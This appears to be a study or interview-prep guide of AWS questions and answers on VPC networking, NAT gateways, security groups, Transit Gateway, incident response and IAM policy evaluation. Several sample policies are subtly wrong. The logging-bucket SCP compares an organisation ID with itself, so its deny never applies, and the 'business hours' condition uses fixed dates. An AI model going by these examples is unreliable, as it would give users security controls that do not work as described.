# 1. VPC & Networking Foundation

### Q1.1: You're designing the network architecture for a three-tier web application (web, app, database) that must run in production with strict security requirements. How do you design the VPC?

**Answer:**

**Context:** A production three-tier app needs network isolation between tiers, controlled internet access, and defense-in-depth.

**Step-by-step design:**

1. **VPC CIDR Selection** — Choose a CIDR block that doesn't overlap with other VPCs or on-prem networks. For a typical workload, `/16` (65,536 IPs) gives room to grow. Example: `10.0.0.0/16`.

2. **Subnet Strategy** — Create three subnet tiers across at least two Availability Zones for high availability:

```
VPC: 10.0.0.0/16

AZ-a:
  Public Subnet:    10.0.1.0/24   (Web/ALB)
  Private Subnet:   10.0.10.0/24  (App servers)
  Isolated Subnet:  10.0.100.0/24 (Databases)

AZ-b:
  Public Subnet:    10.0.2.0/24   (Web/ALB)
  Private Subnet:   10.0.20.0/24  (App servers)
  Isolated Subnet:  10.0.200.0/24 (Databases)
```

3. **Route Tables:**
   - **Public RT:** `0.0.0.0/0 → Internet Gateway (IGW)` — resources here get public IPs and direct internet access.
   - **Private RT:** `0.0.0.0/0 → NAT Gateway` — resources here can reach the internet (for patches, API calls) but are not directly reachable from outside.
   - **Isolated RT:** No internet route. Only local VPC traffic. Databases sit here.

4. **Internet Gateway (IGW):** Attached to the VPC. Allows bi-directional internet access for resources in public subnets that have public/Elastic IPs.

**Architecture:**

```
Internet
    │
    ▼
┌─── IGW ───┐
│            │
│   VPC: 10.0.0.0/16
│
├── Public Subnets (10.0.1.0/24, 10.0.2.0/24)
│     │  ALB, NAT GW, Bastion
│     │
│     ▼  (Private RT: 0.0.0.0/0 → NAT GW)
├── Private Subnets (10.0.10.0/24, 10.0.20.0/24)
│     │  App Servers (EC2/ECS)
│     │
│     ▼  (Isolated RT: local only)
├── Isolated Subnets (10.0.100.0/24, 10.0.200.0/24)
│     │  RDS, ElastiCache
│     │
└─────┘
```

**Design decisions:**
- `/24` subnets give 251 usable IPs each (AWS reserves 5). Enough for most tiers; scale up with larger CIDR if needed.
- NAT Gateway is placed in a public subnet, one per AZ for HA. Each costs ~$32/month + data processing.
- Isolated subnets have NO NAT route — databases should never initiate outbound internet connections.

**Trade-offs:**
- More AZs = higher availability but higher NAT GW cost and cross-AZ data transfer charges (~$0.01/GB each direction).
- Larger CIDR blocks = more room but more wasted address space and potential peering conflicts.

**Multi-account:** In AWS Organizations, each account (dev, staging, prod) gets its own VPC with non-overlapping CIDRs (e.g., dev: `10.1.0.0/16`, staging: `10.2.0.0/16`, prod: `10.0.0.0/16`). This enables VPC peering or Transit Gateway connectivity without conflicts.

**Multi-region:** Replicate the VPC design in each region with different CIDR ranges (e.g., `10.0.0.0/16` in us-east-1, `10.10.0.0/16` in eu-west-1). Use Transit Gateway inter-region peering for connectivity.

**Concepts introduced:**
- **CIDR (Classless Inter-Domain Routing):** Notation for IP address ranges. `/16` = 65,536 IPs, `/24` = 256 IPs. AWS VPC supports `/16` to `/28`.
- **Subnets:** Segments of a VPC CIDR tied to a single AZ. A subnet is public if its route table has a route to an IGW; private otherwise.
- **Route Table:** A set of rules (routes) that determine where network traffic is directed. Each subnet must be associated with exactly one route table.
- **Internet Gateway (IGW):** A horizontally scaled, redundant VPC component that allows communication between a VPC and the internet. One IGW per VPC.
- **Availability Zone (AZ):** A physically separate data center within a region, with independent power, cooling, and networking. Deploying across AZs provides fault isolation.

---

### Q1.2: Your private EC2 instances need to download OS patches and call third-party APIs. They should NOT be directly reachable from the internet. How do you enable this?

**Answer:**

**Context:** Private instances need outbound-only internet access. Direct internet exposure would violate security policies.

**Solution: NAT Gateway**

Place a NAT Gateway in a public subnet. Update the private subnet's route table to send `0.0.0.0/0` traffic to the NAT GW.

```
Private EC2 ──► Private RT (0.0.0.0/0 → nat-gw-id) ──► NAT GW (in Public Subnet) ──► IGW ──► Internet
```

**NAT Gateway specifics:**
- Managed service — no patching, auto-scales to 100 Gbps.
- Supports TCP, UDP, and ICMP.
- Gets an Elastic IP (static public IP).
- Charged per hour (~$0.045/hr) + per GB processed ($0.045/GB in most regions).
- AZ-scoped: if the AZ goes down, the NAT GW is unavailable. For HA, deploy one NAT GW per AZ with AZ-specific route tables.

**HA Architecture:**

```
                       Internet
                          │
                         IGW
                       /     \
              AZ-a                 AZ-b
        ┌─────────────┐     ┌─────────────┐
        │ Public Sub   │     │ Public Sub   │
        │  NAT-GW-a    │     │  NAT-GW-b    │
        └──────┬──────┘     └──────┬──────┘
               │                    │
        ┌──────┴──────┐     ┌──────┴──────┐
        │ Private Sub  │     │ Private Sub  │
        │  EC2-a       │     │  EC2-b       │
        └─────────────┘     └─────────────┘

RT for Private-a: 0.0.0.0/0 → NAT-GW-a
RT for Private-b: 0.0.0.0/0 → NAT-GW-b
```

**Trade-offs:**
- HA NAT GW (one per AZ) costs ~$65/month per AZ in base charges alone. For dev/staging, a single NAT GW saves costs at the risk of cross-AZ charges and single-AZ failure.
- Alternative: NAT Instance (a self-managed EC2 running NAT). Cheaper for small workloads, but you handle patching, scaling, and failover yourself.
- For AWS service access only (S3, DynamoDB, etc.), use VPC Endpoints instead of NAT GW to avoid data processing charges entirely (covered in Q12.1).

**Multi-account:** Each account's VPC has its own NAT Gateways. In a centralized egress pattern, all private subnets across accounts route through a shared "Networking" account's NAT GWs via Transit Gateway, reducing NAT GW proliferation and centralizing egress IP management.

**Multi-region:** NAT GWs are regional and AZ-scoped. Each region needs its own NAT GWs.

**Concepts introduced:**
- **NAT Gateway:** A managed service that allows instances in private subnets to initiate outbound traffic to the internet while preventing unsolicited inbound connections. Performs Network Address Translation — replaces the private source IP with the NAT GW's Elastic IP.
- **Elastic IP (EIP):** A static, public IPv4 address you can allocate and associate with resources. Unlike auto-assigned public IPs, EIPs persist across stop/start cycles.

---

### Q1.3: A security audit found that your VPC has overly permissive security rules. Explain the defense-in-depth strategy using Security Groups and NACLs, and how they differ.

**Answer:**

**Context:** Defense-in-depth means multiple layers of security controls, so if one layer is misconfigured, another layer catches the threat.

**Layer 1: Security Groups (SGs) — Instance-level firewall**

- **Stateful:** If inbound traffic is allowed, the return traffic is automatically allowed (and vice versa). You don't need explicit outbound rules for response traffic.
- **Allow-only rules:** You can only specify ALLOW rules. There is no DENY. Any traffic not explicitly allowed is implicitly denied.
- **Applied to ENIs (Elastic Network Interfaces):** Each EC2 instance, RDS instance, Lambda function (in VPC), ALB, etc. has ENIs with associated SGs.
- **Supports SG references:** You can allow traffic "from SG-abc" instead of IP ranges. This is powerful because it dynamically applies to any resource in that SG regardless of IP changes.

Example for three-tier app:

```
SG-ALB:    Inbound: 443 from 0.0.0.0/0
SG-App:    Inbound: 8080 from SG-ALB
SG-DB:     Inbound: 5432 from SG-App
```

Traffic flow: `Internet → (443) → ALB [SG-ALB] → (8080) → App [SG-App] → (5432) → RDS [SG-DB]`

Key point: The database SG only accepts traffic from the app SG. Even if someone compromises the ALB, they cannot reach the database directly because SG-DB doesn't reference SG-ALB.

**Layer 2: Network ACLs (NACLs) — Subnet-level firewall**

- **Stateless:** You must create explicit rules for both inbound AND outbound traffic. If you allow inbound TCP 443, you must also allow outbound on ephemeral ports (1024–65535) for the response.
- **Allow AND Deny rules:** Evaluated in rule number order (lowest first). First match wins.
- **Applied at the subnet boundary:** All traffic entering or leaving a subnet is evaluated.
- **Default NACL:** Allows all inbound and outbound. Custom NACLs deny all by default.

**Defense-in-depth pattern:**

```
Internet → NACL (Subnet boundary) → Security Group (Instance boundary) → EC2
```

- NACLs: Use for broad deny rules (e.g., block known malicious CIDR ranges, restrict ephemeral port ranges).
- SGs: Use for fine-grained allow rules per service tier.

**Design guidance:**
- SGs are your primary control. Use SG-to-SG references for inter-tier rules.
- NACLs are your emergency brake. Use them to quickly block a CIDR range during an incident without modifying SGs on every instance.
- Avoid complex NACL rulesets — they're stateless, so every rule needs a corresponding return-traffic rule, which becomes hard to maintain.

**Trade-offs:**
- SGs are simpler and more flexible (stateful, SG references). NACLs add complexity (stateless, numbered rules) but provide a second security boundary.
- In practice, many teams rely primarily on SGs and use NACLs only for explicit IP-based blocks or compliance requirements.

**Multi-account:** Security Groups cannot span accounts. In a shared VPC (via RAM — Resource Access Manager), the networking account owns the VPC and subnets, but participant accounts manage their own SGs. NACLs are managed by the VPC owner account only.

**Multi-region:** SGs and NACLs are region-specific and VPC-specific. Security configurations don't automatically replicate. Use Infrastructure as Code (Terraform, CloudFormation) to maintain consistent SG/NACL rules across regions.

**Concepts introduced:**
- **Security Group (SG):** A stateful, instance-level virtual firewall. Only allow rules. Supports SG-to-SG references.
- **Network ACL (NACL):** A stateless, subnet-level firewall. Supports allow and deny rules. Rules are evaluated by number (lowest first).
- **Stateful vs Stateless:** Stateful means the firewall tracks connections — if request traffic is allowed, response traffic is automatically allowed. Stateless means each packet is evaluated independently against the rules.
- **Elastic Network Interface (ENI):** A virtual network card attached to an instance. Has private IPs, public IPs, SGs, and MAC addresses. Resources in a VPC communicate through ENIs.

---

### Q1.4: Two VPCs in the same region need to communicate privately — one VPC hosts your application, the other hosts shared services (e.g., logging, monitoring). How do you connect them?

**Answer:**

**Context:** Direct communication between VPCs requires an explicit networking construct. VPCs are isolated by default.

**Option 1: VPC Peering**

- Creates a direct, private network link between two VPCs.
- Traffic stays on the AWS backbone — no internet traversal, no bandwidth bottleneck.
- Works across accounts and across regions (inter-region peering).
- Non-transitive: If VPC-A peers with VPC-B, and VPC-B peers with VPC-C, VPC-A **cannot** reach VPC-C through VPC-B. You'd need a direct A↔C peering.

**Setup steps:**
1. Create peering request from VPC-A.
2. Accept in VPC-B (can be a different account).
3. Update route tables in both VPCs to point the remote CIDR to the peering connection.

```
VPC-A Route Table:  10.1.0.0/16 → pcx-abc123
VPC-B Route Table:  10.0.0.0/16 → pcx-abc123
```

**Constraints:**
- CIDR ranges must NOT overlap.
- No transitive routing.
- Max 125 active peering connections per VPC.
- DNS resolution across peering requires enabling "DNS resolution from accepter/requester VPC" on the peering connection.

**Architecture:**

```
┌───────────────────┐         ┌───────────────────┐
│ VPC-A: App        │         │ VPC-B: Shared Svcs │
│ 10.0.0.0/16       │◄──pcx──►│ 10.1.0.0/16       │
│                   │         │ (Logging, Monitor) │
└───────────────────┘         └───────────────────┘
```

**When to use:** Simple, two-VPC connectivity. Low operational overhead. Best when you have a small number of VPCs.

**When NOT to use:** When you have many VPCs (10+), because peering connections grow as n*(n-1)/2 (full mesh). That's when Transit Gateway is better.

**Trade-offs:**
- VPC Peering: No additional cost for same-region data transfer (only standard cross-AZ/cross-region charges). No single point of failure. But doesn't scale past a handful of VPCs.
- Inter-region peering: Charged at inter-region data transfer rates (~$0.01–$0.02/GB depending on regions).

**Multi-account:** VPC peering works across accounts. The accepter account must explicitly accept the peering request. Route tables in both accounts must be updated. IAM permissions needed: `ec2:AcceptVpcPeeringConnection` in the accepter account.

**Multi-region:** Inter-region VPC peering is supported. Traffic is encrypted in transit automatically. Latency is higher than same-region.

**Concepts introduced:**
- **VPC Peering:** A networking connection between two VPCs that enables private IP communication. Non-transitive, requires non-overlapping CIDRs, and needs route table entries in both VPCs.

---

### Q1.5: Your organization has 25 VPCs across 4 AWS accounts (dev, staging, prod, shared-services). Managing VPC peering is becoming unmanageable. What do you recommend?

**Answer:**

**Context:** VPC peering with 25 VPCs would require up to 300 peering connections for full mesh. Operationally nightmarish.

**Solution: AWS Transit Gateway (TGW)**

Transit Gateway acts as a central hub that all VPCs (and on-prem networks via VPN/Direct Connect) connect to. Think of it as a cloud router.

**Architecture:**

```
                    ┌──────────────────────────┐
                    │     Transit Gateway        │
                    │                            │
                    │  ┌──────────────────────┐  │

                    │  └──────────────────────┘  │
                    └─┬───┬───┬───┬───┬───┬──────┘
                      │   │   │   │   │   │
                 ┌────┘   │   │   │   │   └────┐
                 ▼        ▼   ▼   ▼   ▼        ▼
              VPC-A    VPC-B ... VPC-N       VPN/DX
              (Prod)   (Dev)     (Shared)   (On-Prem)
```

**Key features:**
- **Hub-and-spoke model:** Each VPC creates a TGW attachment. No more n² peering.
- **TGW Route Tables:** Control which VPCs can communicate with which. Isolate prod from dev by associating them with different TGW route tables.
- **Supports cross-account:** Share TGW via AWS RAM (Resource Access Manager) to other accounts.
- **Supports cross-region:** TGW Peering connects TGWs in different regions.
- **Supports VPN and Direct Connect:** On-prem connectivity through TGW.

**TGW Route Table architecture for isolation:**

```
TGW RT "Prod":
  Associations: VPC-Prod-1, VPC-Prod-2, VPC-Shared-Services
  Propagations: VPC-Prod-1, VPC-Prod-2, VPC-Shared-Services
  → Prod VPCs can reach each other and shared services

TGW RT "Dev":
  Associations: VPC-Dev-1, VPC-Dev-2, VPC-Shared-Services
  Propagations: VPC-Dev-1, VPC-Dev-2, VPC-Shared-Services
  → Dev VPCs can reach each other and shared services, but NOT prod
```

**Association vs Propagation:**
- **Association:** Links a TGW attachment to a route table. Determines which RT is used to evaluate traffic FROM that attachment.
- **Propagation:** Automatically adds a route for the attachment's CIDR into the route table. Determines which attachments are reachable.

An attachment can associate with only ONE RT but propagate into MANY RTs.

**Cost:**
- Per attachment: ~$0.05/hr (~$36/month per VPC attachment).
- Per GB processed: ~$0.02/GB.
- 25 VPCs = 25 attachments = ~$900/month in base charges. Factor this into your architecture cost model.

**Trade-offs:**
- TGW simplifies management enormously but adds per-GB processing costs that VPC peering doesn't have (for same-region).
- TGW has slightly higher latency than direct VPC peering (extra hop through the TGW).
- TGW is regional — for cross-region, you need TGW peering between TGWs in each region.

**Multi-account:** TGW is owned by a central Networking account. Shared via RAM to other accounts. Each account creates its own TGW attachment for its VPC. The networking account manages the TGW route tables for traffic isolation.

**Multi-region:** Deploy one TGW per region. Use TGW inter-region peering to connect them. Traffic between regions traverses the AWS backbone, is encrypted, and incurs inter-region data transfer charges.

**Concepts introduced:**
- **Transit Gateway (TGW):** A regional network transit hub that connects VPCs, VPN connections, and Direct Connect gateways. Supports route tables for traffic segmentation.
- **TGW Association:** Binds an attachment to a route table — traffic FROM that attachment is evaluated against that RT.
- **TGW Propagation:** Adds the attachment's routes INTO a route table — makes that attachment's CIDR reachable from other attachments associated with that RT.
- **AWS RAM (Resource Access Manager):** A service to share AWS resources (TGW, subnets, etc.) across accounts within an Organization.

### Q1.6: You need EC2 instances in a private subnet to reach the S3 API without traversing the internet or NAT Gateway. How?

**Answer:**

**Context:** NAT Gateway costs include per-GB data processing fees. If your app transfers TBs to S3 monthly, that's expensive. Also, some compliance regimes require that data never traverses the internet.

**Solution: S3 Gateway Endpoint**

```
EC2 (Private Subnet) ──► Route Table (pl-xxx → vpce-xxx) ──► S3 Gateway Endpoint ──► S3
```

A Gateway VPC Endpoint for S3 adds a route in your route table that directs S3-bound traffic through the endpoint — not through the NAT Gateway or IGW. No data processing charges.

**Setup:**
1. Create a Gateway Endpoint for `com.amazonaws.<region>.s3`.
2. Associate it with the relevant route tables.
3. AWS automatically adds a prefix list route (`pl-xxxxxxxx`) to those route tables pointing to the endpoint.

**Key properties:**
- Free — no hourly or per-GB charges.
- Only available for S3 and DynamoDB (Gateway Endpoints).
- Route table-based — traffic is routed by the prefix list entry.
- Can attach an endpoint policy to restrict which S3 buckets or actions are allowed through the endpoint.
- Region-scoped — only works for S3 buckets in the same region as the VPC.

**Endpoint Policy example (restrict to specific bucket):**

```json
{
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-app-bucket",
        "arn:aws:s3:::my-app-bucket/*"
      ]
    }
  ]
}
```

Full endpoint deep-dive in Q12.1 (Gateway vs Interface Endpoints).

**Multi-account:** Each VPC (in each account) needs its own Gateway Endpoint. Endpoint policies can reference S3 buckets in other accounts — cross-account access is controlled by the combination of the endpoint policy, the S3 bucket policy, and the IAM policy on the principal.

**Multi-region:** Gateway Endpoints are region-scoped. For cross-region S3 access, you'd still go through NAT GW or use S3 Cross-Region Replication to keep data local.

---

### Q1.7: During a security incident, you discover that an EC2 instance in a private subnet is making suspicious outbound connections. How do you investigate and what VPC tools help?

**Answer:**

**Context:** Incident response requires visibility into network traffic and the ability to quickly isolate compromised resources.

**Investigation tools:**

1. **VPC Flow Logs:**
   - Capture metadata about IP traffic going to/from ENIs, subnets, or the entire VPC.
   - Fields include: source/dest IP, source/dest port, protocol, action (ACCEPT/REJECT), bytes, packets.
   - Published to CloudWatch Logs, S3, or Kinesis Data Firehose.
   - NOT packet contents — just metadata (like NetFlow).
   - Enable at VPC level for broadest coverage.

   Example flow log record:
   ```
   2 123456789012 eni-abc 10.0.10.45 203.0.113.99 49321 443 6 15 12000 ACCEPT
   ```
   This shows the private instance (10.0.10.45) connecting outbound to 203.0.113.99 on port 443.

2. **DNS Query Logging (Route 53 Resolver):** Logs all DNS queries from within the VPC. Useful to see if the instance is resolving suspicious domains (C2 servers, crypto mining pools).

3. **Traffic Mirroring:** Copies actual network packets (not just metadata) from an ENI to an inspection target. Useful for deep packet analysis but has performance and cost implications.

**Containment steps:**
1. **Immediate:** Replace the instance's SG with a "quarantine" SG that denies all inbound and outbound traffic except for a forensics instance on a specific port.
2. **Do NOT terminate** the instance — you lose evidence. Instead, isolate it.
3. **Snapshot the EBS volumes** for forensic analysis.
4. **NACL block:** Add a NACL deny rule for the suspicious destination IP as a fast broad block at the subnet level.

**Architecture of forensic isolation:**

```
Compromised EC2 ─────── SG: quarantine (deny all except forensics)
    │
    ├── EBS Snapshot → Forensic volume → Forensics EC2
    │
    └── VPC Flow Logs → S3/CloudWatch → Analysis
```

**Multi-account:** VPC Flow Logs are per-account/per-VPC. In a central security account model, stream flow logs from all accounts to a central S3 bucket in the security account for aggregated analysis. Use GuardDuty (Q22.1) for automated threat detection across accounts.

**Multi-region:** Flow logs are regional. Centralize by shipping to a single S3 bucket or CloudWatch Logs destination in a primary region.

**Concepts introduced:**
- **VPC Flow Logs:** Metadata capture for network traffic at the ENI, subnet, or VPC level. Not packet contents. Useful for troubleshooting connectivity and security analysis.
- **Traffic Mirroring:** Full packet capture (Layer 7 visibility) from an ENI to inspection tools. More detailed than flow logs but higher cost and performance impact.

### Q1.8: An application in VPC-A (account A) needs to connect to an RDS database in VPC-B (account B). The database should not be accessible from the internet. What are your options and trade-offs?

**Answer:**

**Context:** Cross-account, cross-VPC private database access is a common enterprise pattern.

**Option 1: VPC Peering (explained in Q1.4)**
- Peer VPC-A and VPC-B across accounts.
- Update RTs in both VPCs.
- Update SG on RDS to allow the app's CIDR or SG (SG references only work within the same VPC, so use CIDR for cross-VPC).
- Simplest for 1:1 connectivity.

**Option 2: Transit Gateway (explained in Q1.5)**
- If you have many VPCs/accounts, connect both to a shared TGW.
- TGW route tables control access.
- Better for n:n connectivity.

**Option 3: PrivateLink (covered in Q12.2)**
- Create an NLB in front of RDS (using RDS's IP as a target) in VPC-B.
- Create a VPC Endpoint Service backed by the NLB.
- Create an Interface VPC Endpoint in VPC-A.
- Traffic flows: App → Interface Endpoint → PrivateLink → NLB → RDS.
- Advantage: The consumer (VPC-A) doesn't need to know VPC-B's CIDR. No route table changes. Works even with overlapping CIDRs.
- Disadvantage: Additional NLB cost and complexity.

**Decision matrix:**

```
| Factor             | VPC Peering | TGW        | PrivateLink   |
|--------------------|------------|------------|---------------|
| Scale (# VPCs)     | Small (<5) | Any        | Any           |
| Overlapping CIDRs  | No         | No         | Yes           |
| Transitive routing | No         | Yes        | N/A           |
| Per-GB cost        | Free*      | $0.02/GB   | $0.01/GB      |
| Hourly cost        | Free       | $0.05/hr   | $0.01/hr/AZ   |
| Operational effort | Low        | Medium     | Medium-High   |
```
*Same-region, same account.

**Multi-account:** All three options work cross-account. VPC Peering requires explicit acceptance. TGW uses RAM sharing. PrivateLink uses endpoint service permissions.

**Multi-region:** VPC Peering and TGW support inter-region. PrivateLink does NOT work cross-region — the consumer endpoint must be in the same region as the endpoint service.

# 2. IAM & Security Foundation

---

### Q2.1: Explain how AWS IAM evaluates whether a request is allowed or denied. Walk through the policy evaluation logic for a cross-account S3 access scenario.

**Answer:**

**Context:** An EC2 instance in Account A (role: `AppRole`) tries to `s3:GetObject` from a bucket in Account B.

**IAM Policy Types (from broadest to narrowest):**

1. **Service Control Policies (SCPs):** Set the maximum permissions for an entire AWS account within an Organization. They don't grant permissions — they set guardrails. (Covered in Q2.3.)

2. **Identity-based Policies:** Attached to IAM users, groups, or roles. Define what that identity CAN do.
   - Managed policies (AWS-managed or customer-managed)
   - Inline policies (embedded directly on the principal)

3. **Resource-based Policies:** Attached to the resource itself (S3 bucket policy, SQS queue policy, KMS key policy). Define who can access this resource and what they can do.

4. **Permissions Boundaries:** Attached to an IAM role or user. Set the maximum permissions that identity-based policies can grant. The effective permissions are the INTERSECTION of the identity policy and the boundary.

5. **Session Policies:** Passed during role assumption (`AssumeRole`). Further restrict the session's permissions.

**Policy Evaluation Order:**

```
Request comes in
       │
       ▼
[Explicit DENY in any policy?] ──Yes──► DENIED
       │ No
       ▼
[SCP allows?] ──No──► DENIED
       │ Yes
       ▼
[Same-account or cross-account?]
       │
   Same-account:
       │ [Identity OR Resource policy allows?] ──No──► DENIED
       │ Yes → Check permissions boundary → ALLOWED
       │
   Cross-account:
       │ [Identity AND Resource policy both allow?] ──No──► DENIED
       │ Yes → ALLOWED
```

**Critical difference:** For same-account access, EITHER the identity policy OR the resource policy can grant access. For cross-account access, BOTH must grant access.

**Cross-account S3 example:**

Account A — IAM Role `AppRole`:
```json
{
  "Effect": "Allow",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::account-b-bucket/*"
}
```

Account B — S3 Bucket Policy:
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::111111111111:role/AppRole"},
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::account-b-bucket/*"
}
```

Both must be present. If Account A has the identity policy but Account B doesn't have the bucket policy, access is denied.

**Multi-account:** The cross-account dual-authorization model (identity + resource) is fundamental. Always ensure both sides grant access. SCPs in either account can further restrict.

**Multi-region:** IAM is global — policies apply regardless of region. S3 buckets are regional but bucket policies are checked in the bucket's region. An IAM role in us-east-1 accessing a bucket in eu-west-1 still follows the same evaluation logic.

**Concepts introduced:**
- **Identity-based Policy:** Attached to IAM principal (user/role/group). Defines what the principal can do.
- **Resource-based Policy:** Attached to the resource (S3 bucket, SQS queue, KMS key, etc.). Defines who can access the resource. Not all services support resource-based policies.
- **Permissions Boundary:** An IAM policy that sets the maximum permissions for a user or role. Effective permissions = intersection of identity policy and boundary.
- **Explicit Deny:** A `"Effect": "Deny"` in any applicable policy always wins over any `Allow`. This is the cardinal rule of IAM evaluation.

---

### Q2.2: Your application in Account A needs to assume a role in Account B to read DynamoDB tables. Explain the entire cross-account role assumption flow.

**Answer:**

**Context:** A common pattern for cross-account access is STS (Security Token Service) role assumption. The app in Account A "becomes" a role in Account B temporarily.

**Step-by-step flow:**

```
Account A                                    Account B
┌──────────────────┐                        ┌──────────────────────┐
│ EC2 Instance     │                        │ Role: CrossAcctReader│
│ Role: AppRole    │                        │ Trust Policy:        │
│                  │─── sts:AssumeRole ───► │  Allows Account A's  │
│ Identity Policy: │                        │  AppRole to assume   │
│  Allow           │                        │                      │
│  sts:AssumeRole  │◄── Temp Credentials ── │ Identity Policy:     │
│  on Account B    │                        │  Allow dynamodb:*    │
│  role ARN        │                        │  on Account B tables │
└──────────────────┘                        └──────────────────────┘
```

**Three things required:**

1. **Trust Policy (on the target role in Account B):**
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::111111111111:role/AppRole"},
  "Action": "sts:AssumeRole"
}
```
This says: "Account A's AppRole is allowed to assume this role."

2. **Identity Policy (on AppRole in Account A):**
```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::222222222222:role/CrossAcctReader"
}
```
This says: "AppRole is allowed to call AssumeRole on this specific role ARN."

3. **STS AssumeRole call:** The app calls `sts:AssumeRole` with the target role ARN. STS returns temporary credentials (access key, secret key, session token) valid for 1–12 hours (default 1 hour).

**The app then uses these temporary credentials** for all DynamoDB calls. The permissions it has are those defined by the target role's identity policies.

**External ID:** For third-party access, add a `Condition` with `sts:ExternalId` to the trust policy to prevent the "confused deputy" problem — where another AWS customer tricks your account into accessing your resources via a shared third-party role.

**Multi-account:** This IS the cross-account access pattern. The trust policy is the gateway. Combined with SCPs, you can restrict which roles in which accounts can be assumed.

**Multi-region:** STS is a global service (with regional endpoints). Role assumption works regardless of region. Use regional STS endpoints for lower latency and resilience.

**Concepts introduced:**
- **STS (Security Token Service):** Issues temporary, limited-privilege credentials for IAM users or federated users. Core operation: `AssumeRole`.
- **Trust Policy:** A resource-based policy on an IAM role that specifies which principals can assume that role. Without this, no one can assume the role.
- **External ID:** A shared secret between the trusting account and a third party, used as a condition in the trust policy to prevent confused deputy attacks.
- **Confused Deputy Problem:** A security issue where a trusted entity (the "deputy") is tricked into performing actions on behalf of an unauthorized party.

### Q2.3: You manage an AWS Organization with 50 accounts. How do you prevent any account from disabling CloudTrail, deleting S3 buckets in the logging account, or launching resources outside approved regions?

**Answer:**

**Context:** In a multi-account setup, individual accounts shouldn't be able to undermine organizational security guardrails, even if they have Admin access within their account.

**Solution: Service Control Policies (SCPs)**

SCPs are attached to OUs or accounts in AWS Organizations. They set the maximum permissions for all IAM principals in that account. Even an account's root user is subject to SCPs (except for a few exceptions like closing the account).

**SCP: Deny CloudTrail Modifications**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ProtectCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail",
        "cloudtrail:UpdateTrail"
      ],
      "Resource": "*"
    }
  ]
}
```

**SCP: Deny S3 Deletion in Logging Account**

```json
{
  "Sid": "ProtectLogBuckets",
  "Effect": "Deny",
  "Action": [
    "s3:DeleteBucket",
    "s3:DeleteObject"
  ],
  "Resource": "arn:aws:s3:::org-central-logs*",
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalOrgID": "${aws:PrincipalOrgID}"
    }
  }
}
```

(Better approach: use S3 Object Lock for immutable logs — covered in Q5.3.)

**SCP: Region Restriction**

```json
{
  "Sid": "DenyOutsideApprovedRegions",
  "Effect": "Deny",
  "NotAction": [
    "iam:*",
    "sts:*",
    "organizations:*",
    "support:*",
    "budgets:*"
  ],
  "Resource": "*",
  "Condition": {
    "StringNotEquals": {
      "aws:RequestedRegion": ["us-east-1", "eu-west-1"]
    }
  }
}
```

Note the use of `NotAction` — this denies everything EXCEPT the listed global services when the request is outside approved regions. Global services (IAM, STS, Organizations) must be excluded because they only operate in us-east-1 regardless of where you call them from.

**How SCPs interact with IAM:**

```
SCP sets the ceiling (maximum permissions)
    │
    ▼
Identity Policy operates within that ceiling
    │
    ▼
Effective permissions = Intersection of SCP ∩ Identity Policy ∩ Permissions Boundary
```

An SCP deny overrides any identity policy allow. An SCP must allow a service for any identity policy allow to be effective.

**Multi-account:** SCPs are the primary mechanism for multi-account governance. Applied at OU level, they cascade to all child OUs and accounts. The management account is NOT affected by SCPs — never run workloads in the management account.

**Multi-region:** The region-restriction SCP above is how you enforce regional boundaries across the organization.

**Concepts introduced:**
- **Service Control Policies (SCPs):** Organization-level policies that set maximum permissions boundaries for accounts. They don't grant permissions — they restrict. Applied to OUs or accounts. The management account is exempt.
- **NotAction:** An IAM policy element that matches everything EXCEPT the listed actions. Used in deny policies to exempt certain global services from region restrictions.
- **aws:RequestedRegion:** An IAM condition key that matches the region the API call is made to. Used for region-restriction policies.

### Q2.4: A developer needs access to specific S3 buckets only during business hours, only from the corporate VPN's IP range, and only if MFA is active. How do you implement this?

**Answer:**

**Context:** Fine-grained access control uses IAM conditions to add contextual restrictions beyond simple allow/deny.

**IAM Policy with Conditions:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::project-alpha-data/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        },
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "2025-01-01T09:00:00Z"
        },
        "DateLessThan": {
          "aws:CurrentTime": "2025-01-01T18:00:00Z"
        }
      }
    }
  ]
}
```

**How conditions work:**
- Multiple condition keys within a single block are ANDed — ALL must be true.
- Multiple values within a single condition key are ORed — ANY can match.
- `aws:SourceIp` doesn't work for calls made from within AWS services (e.g., Lambda, EC2 with a role). For VPC-based restrictions, use `aws:SourceVpc` or `aws:SourceVpce`.

**Better approach for VPC-based restriction:**

```json
"Condition": {
  "StringEquals": {
    "aws:SourceVpc": "vpc-abc123"
  }
}
```

**Commonly used condition keys:**
- `aws:SourceIp` — Requester's IP (doesn't work for service-to-service calls).
- `aws:SourceVpc` / `aws:SourceVpce` — The VPC or VPC endpoint the request came through.
- `aws:PrincipalOrgID` — The Organization ID of the calling principal.
- `aws:PrincipalTag/<key>` — Tags on the calling IAM principal (enables ABAC — Attribute-Based Access Control).
- `aws:MultiFactorAuthPresent` — Whether the request was authenticated with MFA.
- `aws:PrincipalArn` — ARN of the calling principal.

**Multi-account:** Condition keys like `aws:PrincipalOrgID` allow you to write resource policies that automatically trust any principal in your Organization without listing individual account IDs. Extremely useful for S3 bucket policies in shared accounts.

**Multi-region:** IAM conditions are evaluated globally. `aws:RequestedRegion` can be combined with other conditions for region-plus-identity restrictions.

**Concepts introduced:**
- **IAM Conditions:** Policy elements that restrict when a statement applies. Support operators like `StringEquals`, `IpAddress`, `DateGreaterThan`, `Bool`, `ArnLike`, etc.
